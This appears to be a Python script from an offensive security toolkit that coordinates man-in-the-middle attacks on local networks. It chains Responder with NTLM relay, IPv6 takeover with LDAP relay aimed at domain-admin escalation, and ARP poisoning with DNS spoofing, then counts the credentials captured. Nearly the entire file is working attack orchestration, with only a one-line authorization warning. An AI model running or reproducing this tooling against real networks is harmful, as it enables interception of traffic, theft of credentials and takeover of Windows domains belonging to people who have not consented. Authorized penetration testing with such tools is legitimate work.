#!/usr/bin/env python3
"""
MITM Attack Orchestrator
Coordinates multiple MITM attacks for maximum effectiveness

WARNING: Active attack suite. Use only with authorization.
"""

import sys
import os
import argparse
import subprocess
import time
import threading
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

class MITMOrchestrator:
    """Coordinates multiple MITM attacks"""
    
    def __init__(self, session_dir, interface='eth0'):
        self.session_dir = session_dir
        self.interface = interface
        self.active_attacks = []
        self.db = DatabaseManager(os.path.join(session_dir, "session.db"))
    
    def run_responder_ntlm_relay_combo(self, targets, duration=600):
        """
        Combo Attack: Responder + NTLM Relay
        
        This is the most effective AD MITM attack
        """
        logger.info("=" * 60)
        logger.info("COMBO ATTACK: Responder + NTLM Relay")
        logger.info("=" * 60)
        logger.info(f"Duration: {duration}s")
        logger.info(f"Targets: {', '.join(targets)}")
        
        # Create target file for ntlmrelayx
        target_file = os.path.join(self.session_dir, 'relay_targets.txt')
        with open(target_file, 'w') as f:
            for target in targets:
                f.write(f"{target}\n")
        
        processes = []
        
        try:
            # Start ntlmrelayx first
            logger.info("[1/2] Starting ntlmrelayx...")
            ntlmrelayx_cmd = [
                'python3', 'ntlm_relay.py',
                '--session-dir', self.session_dir,
                '--targets', ','.join(targets),
                '--mode', 'smb'
            ]
            
            relay_proc = subprocess.Popen(
                ntlmrelayx_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            processes.append(('ntlmrelayx', relay_proc))
            time.sleep(5)  # Let relay start
            
            # Start Responder
            logger.info("[2/2] Starting Responder...")
            responder_cmd = [
                'python3', 'responder.py',
                '--session-dir', self.session_dir,
                '--interface', self.interface,
                '--duration', str(duration)
            ]
            
            responder_proc = subprocess.Popen(
                responder_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            processes.append(('responder', responder_proc))
            
            logger.warning("⚠️  Combo attack running...")
            logger.warning("⚠️  Responder will poison → ntlmrelayx will relay")
            
            # Wait for duration
            time.sleep(duration)
            
            logger.info("Combo attack duration complete, stopping...")
            
        except KeyboardInterrupt:
            logger.warning("Combo attack interrupted by user")
        
        finally:
            # Stop all processes
            for name, proc in processes:
                try:
                    proc.terminate()
                    proc.wait(timeout=10)
                    logger.info(f"Stopped {name}")
                except:
                    proc.kill()
        
        logger.info("✅ Combo attack complete")
        return True
    
    def run_ipv6_smb_relay_combo(self, domain, dc_ip, duration=600):
        """
        Combo Attack: IPv6 Takeover + SMB to LDAP Relay
        
        Goal: Escalate to Domain Admin
        """
        logger.info("=" * 60)
        logger.info("COMBO ATTACK: IPv6 + SMB→LDAP Relay")
        logger.info("=" * 60)
        logger.info(f"Domain: {domain}")
        logger.info(f"DC: {dc_ip}")
        logger.info(f"Duration: {duration}s")
        
        logger.warning("⚠️  Goal: Escalate to Domain Admin via LDAP relay")
        
        # This combo uses ipv6_attack.py with relay-target
        cmd = [
            'python3', 'ipv6_attack.py',
            '--session-dir', self.session_dir,
            '--domain', domain,
            '--interface', self.interface,
            '--duration', str(duration),
            '--relay-target', dc_ip
        ]
        
        try:
            logger.info(f"Command: {' '.join(cmd)}")
            subprocess.run(cmd, timeout=duration + 60)
            logger.info("✅ IPv6 + LDAP relay combo complete")
            return True
        except subprocess.TimeoutExpired:
            logger.warning("Combo timed out")
            return False
        except Exception as e:
            logger.error(f"Combo failed: {e}")
            return False
    
    def run_arp_dns_spoof_combo(self, target, gateway, attacker_ip, 
                                 spoof_domains, duration=600):
        """
        Combo Attack: ARP Poisoning + DNS Spoofing
        
        Goal: Complete traffic control
        """
        logger.info("=" * 60)
        logger.info("COMBO ATTACK: ARP + DNS Spoofing")
        logger.info("=" * 60)
        logger.info(f"Target: {target}")
        logger.info(f"Gateway: {gateway}")
        logger.info(f"DNS Spoof: {', '.join(spoof_domains)}")
        
        processes = []
        
        try:
            # Start ARP poisoning
            logger.info("[1/2] Starting ARP poisoning...")
            arp_cmd = [
                'python3', 'arp_poisoning_suite.py',
                '--session-dir', self.session_dir,
                '--target', target,
                '--gateway', gateway,
                '--interface', self.interface,
                '--duration', str(duration)
            ]
            
            arp_proc = subprocess.Popen(
                arp_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            processes.append(('arp', arp_proc))
            time.sleep(3)
            
            # Start DNS spoofing
            logger.info("[2/2] Starting DNS spoofing...")
            dns_cmd = [
                'python3', 'dns_spoofing.py',
                '--session-dir', self.session_dir,
                '--interface', self.interface,
                '--attacker-ip', attacker_ip,
                '--target-domains', ','.join(spoof_domains),
                '--duration', str(duration)
            ]
            
            dns_proc = subprocess.Popen(
                dns_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            processes.append(('dns', dns_proc))
            
            logger.warning("⚠️  Full MITM active: ARP + DNS")
            
            # Wait
            time.sleep(duration)
            
        except KeyboardInterrupt:
            logger.warning("Combo interrupted")
        
        finally:
            for name, proc in processes:
                try:
                    proc.terminate()
                    proc.wait(timeout=10)
                    logger.info(f"Stopped {name}")
                except:
                    proc.kill()
        
        logger.info("✅ ARP + DNS combo complete")
        return True
    
    def summarize_results(self):
        """Generate summary of all MITM attacks"""
        logger.info("=" * 60)
        logger.info("MITM Attack Summary")
        logger.info("=" * 60)
        
        # Query database for captured credentials
        session = self.db.get_session()
        credentials = self.db.get_all_credentials()
        session.close()
        
        logger.info(f"Total credentials captured: {len(credentials)}")
        
        # Group by source
        by_source = {}
        for cred in credentials:
            source = cred.source or 'Unknown'
            if source not in by_source:
                by_source[source] = []
            by_source[source].append(cred)
        
        for source, creds in by_source.items():
            logger.info(f"  {source}: {len(creds)} credentials")
        
        return {
            'total': len(credentials),
            'by_source': {k: len(v) for k, v in by_source.items()}
        }


def main(session_dir, mode, **kwargs):
    """Main orchestrator execution"""
    global logger
    
    setup_logger("mitm_orchestrator", session_dir)
    logger = get_logger("mitm_orchestrator")
    
    # Check for root
    if os.geteuid() != 0:
        logger.error("MITM attacks require root privileges")
        return
    
    logger.info("=" * 60)
    logger.info("MITM Attack Orchestrator")
    logger.info("=" * 60)
    
    orchestrator = MITMOrchestrator(session_dir, kwargs.get('interface', 'eth0'))
    
    # Execute based on mode
    if mode == 'responder-relay':
        targets = kwargs['targets'].split(',')
        duration = kwargs.get('duration', 600)
        success = orchestrator.run_responder_ntlm_relay_combo(targets, duration)
    
    elif mode == 'ipv6-ldap':
        success = orchestrator.run_ipv6_smb_relay_combo(
            kwargs['domain'],
            kwargs['dc'],
            kwargs.get('duration', 600)
        )
    
    elif mode == 'arp-dns':
        success = orchestrator.run_arp_dns_spoof_combo(
            kwargs['target'],
            kwargs['gateway'],
            kwargs['attacker_ip'],
            kwargs['spoof_domains'].split(','),
            kwargs.get('duration', 600)
        )
    
    else:
        logger.error(f"Unknown mode: {mode}")
        return
    
    # Summarize results
    if success:
        orchestrator.summarize_results()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="MITM Attack Orchestrator - Coordinate multiple attacks"
    )
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--mode", required=True,
                       choices=['responder-relay', 'ipv6-ldap', 'arp-dns'])
    parser.add_argument("--interface", default="eth0")
    parser.add_argument("--duration", type=int, default=600)
    
    # Responder-Relay mode
    parser.add_argument("--targets", help="Comma-separated relay targets")
    
    # IPv6-LDAP mode
    parser.add_argument("--domain", help="Target domain")
    parser.add_argument("--dc", help="Domain Controller IP")
    
    # ARP-DNS mode
    parser.add_argument("--target", help="ARP poison target")
    parser.add_argument("--gateway", help="Gateway IP")
    parser.add_argument("--attacker-ip", help="Attacker IP for DNS")
    parser.add_argument("--spoof-domains", help="Comma-separated domains to spoof")
    
    args = parser.parse_args()
    
    main(args.session_dir, args.mode, **vars(args))
